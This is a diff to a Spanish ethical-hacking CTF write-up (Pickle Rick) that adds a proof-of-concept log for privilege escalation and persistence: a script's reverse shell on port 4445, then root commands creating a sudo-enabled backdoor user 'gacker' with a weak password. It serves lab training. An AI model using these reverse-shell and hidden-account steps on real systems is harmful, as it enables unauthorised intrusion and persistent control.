@@ -376,16 +376,6 @@ Una vez obtenida la shell en la máquina víctima, el siguiente paso es escalar 
 
 Durante la resolución manual del CTF se identificó el método de escalada.
 
-Ejemplo conceptual:
-
-www-data → root
-
-Investigar:
-
-sudo -l  
-permisos sudo  
-comandos permitidos
-
 ---
 
 # Fase 9 — Persistencia
@@ -397,11 +387,40 @@ Una vez obtenidos privilegios de root, se configurará persistencia en el sistem
 1. Crear un nuevo usuario en el sistema.
 2. Asignarle privilegios sudo.
 
-Investigar:
+PoC de las fases 8 y 9, mostrando como ahora somos el usuario gacker y tenemos permiso de sudo ejecutando sudo whoami y
+viendo como nos devuelve como respuesta root:
 
-useradd  
-passwd  
-usermod  
+(.venv) gabri@GGA-TPX23:~/Documentos/hacking-etico-master$ python ctf/pickle-rick/archivo_pocs/PoC-07/PoC-07-Persistencia.py 
+Peticion de login enviada. Verificando...
+Login exitoso! Mostrando las cookies de sesion: <RequestsCookieJar[<Cookie PHPSESSID=s09a5p0oqa2972kuv6128uccf2 for 10.128.151.11/>]>
+--------------------------------------------------
+REALIZANDO REVERSE SHELL --> COGIENDO LLAMADA P4445 (Listener)
+--------------------------------------------------
+Escuchando en el puerto 4445...
+Payload ofuscado listo para enviar...
+Conexión recibida de 10.128.151.11!
+El servidor dice que somos: $ sudo su
+useradd -m -s /bin/bash gacker
+echo 'gacker:gacker' | chpasswd
+usermod -aG sudo gacker
+sudo su gacker
+whoami
+echo 'gacker' | sudo -S whoami
+root@ip-10-128-151-11:/var/www/html# useradd -m -s /bin/bash gacker
+useradd: user 'gacker' already exists
+root@ip-10-128-151-11:/var/www/html# echo 'gacker:gacker' | chpasswd
+root@ip-10-128-151-11:/var/www/html# usermod -aG sudo gacker
+root@ip-10-128-151-11:/var/www/html# sudo su gacker
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+gacker@ip-10-128-151-11:/var/www/html$ whoami
+gacker
+gacker@ip-10-128-151-11:/var/www/html$ echo 'gacker' | sudo -S whoami
+[sudo] password for gacker: root
+gacker@ip-10-128-151-11:/var/www/html$ 
+Reverse Shell lanzada.
+(.venv) gabri@GGA-TPX23:~/Documentos/hacking-etico-master
 
 ---
 
